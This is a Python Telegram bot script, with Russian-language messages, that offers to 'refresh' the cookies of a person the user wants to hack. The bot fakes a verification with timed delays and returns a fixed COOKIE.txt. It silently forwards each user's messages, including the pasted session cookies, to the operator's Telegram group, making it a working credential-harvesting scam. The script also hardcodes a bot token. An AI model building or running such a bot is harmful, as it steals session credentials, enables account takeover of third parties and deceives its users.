import os
import telebot
import time

TOKEN = "8260437183:AAG2NNbMPhsvkWjkxYaxAjceNm9jward6UA"
GROUP_ID = "-1003396901780"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_command(message):
    # Игнорируем сообщения из групп
    if message.chat.type != 'private':
        return
        
    bot.send_message(
        message.chat.id, 
        "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪"
    )
    try:
        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
    except Exception as e:
        print(f"Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    # Игнорируем сообщения из групп (реагируем только на личные сообщения)
    if message.chat.type != 'private':
        return
        
    bot.send_message(message.chat.id, "Проверка куки...")
    time.sleep(2)
    bot.send_message(message.chat.id, "Проверка прошла успешно ✅ Идёт инициализация...")
    time.sleep(30)
    bot.send_message(message.chat.id, "Инициализация завершена✅ ваш файл с куки:")
    
    # Отправляем файл COOKIE.txt
    try:
        with open('COOKIE.txt', 'rb') as cookie_file:
            bot.send_document(message.chat.id, cookie_file, caption="📁 Ваш файл с куки")
        print("✅ Файл COOKIE.txt отправлен пользователю")
    except FileNotFoundError:
        bot.send_message(message.chat.id, "❌ Файл с куки не найден")
        print("❌ Файл COOKIE.txt не найден")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка отправки файла: {e}")
        print(f"❌ Ошибка отправки файла: {e}")
    
    try:
        bot.send_message(
            GROUP_ID, 
            f"📩 Сообщение от: {message.from_user.first_name}\nТекст: {message.text}"
        )
    except Exception as e:
        print(f"Ошибка отправки в группу: {e}")

print("🚀 Бот запущен и готов к работе!")
bot.polling(none_stop=True)
